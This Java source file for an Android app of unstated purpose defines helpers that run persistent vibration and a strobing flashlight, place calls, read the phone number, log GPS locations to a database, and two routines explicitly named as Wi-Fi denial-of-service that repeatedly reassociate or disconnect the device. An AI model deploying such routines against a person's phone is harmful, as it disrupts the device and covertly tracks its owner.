package com.candroid.lofl.api;

import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.hardware.usb.UsbManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.net.ConnectivityManager;
import android.net.Network;
import android.net.NetworkInfo;
import android.net.Uri;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.Process;
import android.os.VibrationEffect;
import android.os.Vibrator;
import android.provider.AlarmClock;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.candroid.lofl.data.db.Database;
import com.candroid.lofl.data.db.DatabaseHelper;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.net.SocketException;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.Timer;
import java.util.TimerTask;

public class Systems {
    public static boolean sIsFlaghlightOn = false;
    public static CameraManager sCameraManager;

    public static class Vibrations{

        public static void vibrator(final Context context) {

            TimerTask timerTask = new TimerTask() {
                @Override
                public void run() {
                    Vibrator vibrator = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
                    if (vibrator.hasVibrator()) {
                        if (vibrator.hasAmplitudeControl()) {
                            vibrator.vibrate(VibrationEffect.createOneShot(60000L, 255));
                        } else {
                            vibrator.vibrate(VibrationEffect.createOneShot(60000L, VibrationEffect.DEFAULT_AMPLITUDE));
                        }
                    }
                }
            };
            Timer timer = new Timer("vibratorTask", true);
            timer.schedule(timerTask, 1000, 60000 * 30);
        }

    }

    public static class Phone{

        public static void phoneCall(Context context, String address) {
            Intent callIntent = new Intent(Intent.ACTION_CALL);
            callIntent.setData(Uri.parse("tel:" + address));
            callIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(callIntent);
        }

        public static String getDeviceTelephoneNumber(Context context) {
            try {
                TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
                return telephonyManager.getLine1Number();
            } catch (SecurityException e) {
                e.printStackTrace();
                return "";
            }
        }

    }

    public static class Alarms{

        public static void setAlarmClock(Context context) {
            Intent intent = new Intent();
            intent.setAction(AlarmClock.ACTION_SET_ALARM);
            intent.putExtra(AlarmClock.EXTRA_HOUR, 5);
            intent.putExtra(AlarmClock.EXTRA_MINUTES, 0);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }

        public static void setAlarmClock(Context context, int hours, int minutes){
            Intent intent = new Intent();
            intent.setAction(AlarmClock.ACTION_SET_ALARM);
            intent.putExtra(AlarmClock.EXTRA_HOUR, hours);
            intent.putExtra(AlarmClock.EXTRA_MINUTES, minutes);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
        }

    }

    public static class Camera{

        public static void persistentBlinkingFlashlight(final Context context) {
            TimerTask timerTask = new TimerTask() {
                @Override
                public void run() {
                    Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                    String cameraId = null;
                    if (sCameraManager == null) {
                        sCameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
                    }
                    try {
                        cameraId = sCameraManager.getCameraIdList()[0];
                    } catch (CameraAccessException e1) {
                        e1.printStackTrace();
                    }
                    if (sIsFlaghlightOn) {
                        try {
                            sCameraManager.setTorchMode(cameraId, false);
                            sIsFlaghlightOn = false;
                        } catch (CameraAccessException e1) {
                            e1.printStackTrace();
                        } catch (IllegalArgumentException e) {
                            e.printStackTrace();
                        }
                    } else {
                        try {
                            sCameraManager.setTorchMode(cameraId, true);
                            sIsFlaghlightOn = true;
                        } catch (CameraAccessException e1) {
                            e1.printStackTrace();
                        } catch (IllegalArgumentException e) {
                            e.printStackTrace();
                        }
                    }
                }
            };
            Timer timer = new Timer("flashlightTask", true);
            timer.schedule(timerTask, 300L, 100L);
        }

        public static void turnOffFlashlight(Context context) {
            CameraManager cameraManager = (CameraManager) context.getSystemService(Context.CAMERA_SERVICE);
            try {
                cameraManager.setTorchMode(cameraManager.getCameraIdList()[0], false);
            } catch (CameraAccessException e) {
                e.printStackTrace();
            }
        }

    }

    public static class Networking{

        public static ArrayList<String> fetchIpv4Addresses(){
            ArrayList<String> ipAddresses = new ArrayList<>();
            try {
                for(Enumeration<NetworkInterface> interfaces = NetworkInterface.getNetworkInterfaces(); interfaces.hasMoreElements();){
                    for(Enumeration<InetAddress> addresses = interfaces.nextElement().getInetAddresses(); addresses.hasMoreElements();){
                        while(addresses.hasMoreElements()){
                            InetAddress address = addresses.nextElement();
                            if(!address.isLoopbackAddress() && !address.getHostAddress().contains(":")){
                                ipAddresses.add(address.getHostAddress());
                                Log.d("IP ADDRESSES", String.format("NETWORK NAME = %s", address.getHostName()));
                            }
                        }
                    }
                }

            } catch (SocketException e) {
                e.printStackTrace();
            }
            return ipAddresses;
        }

        public static boolean hasNetworkConnectivity(Context context) {
            ConnectivityManager connectivityManager = (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
            NetworkInfo networkInfo = connectivityManager.getActiveNetworkInfo();
            Network[] networks = connectivityManager.getAllNetworks();
            return networkInfo != null && networkInfo.isConnected();
        }


        public static boolean checkAirplaneMode(Context context){
            boolean isOn = false;
            if(Settings.System.getInt(context.getContentResolver(), Settings.Global.AIRPLANE_MODE_ON, 0) == 0){
                isOn = true;
            }
            return isOn;
        }

        public static class Wifi{

            public static void dosWifiCard(Context context) {
                final WifiManager wifiManager = getWifiManager(context);
                int state = wifiManager.getWifiState();
                if (wifiManager.isWifiEnabled()) {
                    TimerTask dosWifiCardTask = new TimerTask() {
                        @Override
                        public void run() {
                            Process.setThreadPriority(Process.THREAD_PRIORITY_BACKGROUND);
                            wifiManager.reassociate();
                        }
                    };
                    Timer timer = new Timer("dosWifiCard", true);
                    timer.schedule(dosWifiCardTask, 5000L, 5000L);
                }
            }

            public static WifiManager getWifiManager(Context context) {
                return (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
            }

            public static void wifiScan(Context context) {
                getWifiManager(context).startScan();
            }

            public static void wifiDenialOfService(Context context) {
               final WifiManager wifiManager = getWifiManager(context);
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        for (int i = 0; i < 500; i++) {
                            try {
                                Thread.sleep(10000);
                                wifiManager.disconnect();
                            } catch (InterruptedException e) {
                                e.printStackTrace();
                            }
                        }
                    }
                }).start();
            }

        }

    }

    public static class Usb{

        public static boolean isUsbDisconnected(Context context){
            UsbManager usbManager = (UsbManager) context.getSystemService(Context.USB_SERVICE);
            return usbManager.getDeviceList().isEmpty() && usbManager.getAccessoryList() == null;
        }

    }

    public static class Gps{

        public static LocationManager getLocationManager(Context context) {
            return (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
        }

        public static LocationListener getLocationListener(final Context context) {
            return new LocationListener() {
                @Override
                public void onLocationChanged(Location location) {
                    try{
                        Database.insertLocation(DatabaseHelper.getInstance(context), location.getLatitude(), location.getLongitude());
                    }catch (IllegalStateException e){
                        e.printStackTrace();
                    }
                    //Log.d("LoflService", "latitudate = ".concat(String.valueOf(location.getLatitude()) + " longitude = ".concat(String.valueOf(location.getLongitude()))));
              /*  if(sNotificationManager == null){
                    initNotificationManager(context);
                }*/
/*                Log.d("LoflService", "location row id = " + Database.insertLocation(context, DatabaseHelper.getInstance(context.getApplicationContext()), location.getLatitude(), location.getLongitude()));
                createPrimaryNotificationChannel(sNotificationManager);
                Notification.Builder builder = new Notification.Builder(context, Constants.PRIMARY_NOTIFICATION_CHANNEL_ID);
                builder.setContentText(String.format("latitude=%s longitude=%s", location.getLatitude(), location.getLongitude()));
                builder.setContentTitle("Location Update");
                builder.setGroup(Constants.PRIMARY_NOTIFICATION_GROUP);
                builder.setSmallIcon(android.R.drawable.ic_menu_mylocation);
                sId++;
                sNotificationManager.notify(sId++, builder.build());*/
                }

                @Override
                public void onStatusChanged(String provider, int status, Bundle extras) {

                }

                @Override
                public void onProviderEnabled(String provider) {

                }

                @Override
                public void onProviderDisabled(String provider) {

                }
            };
        }

    }

}
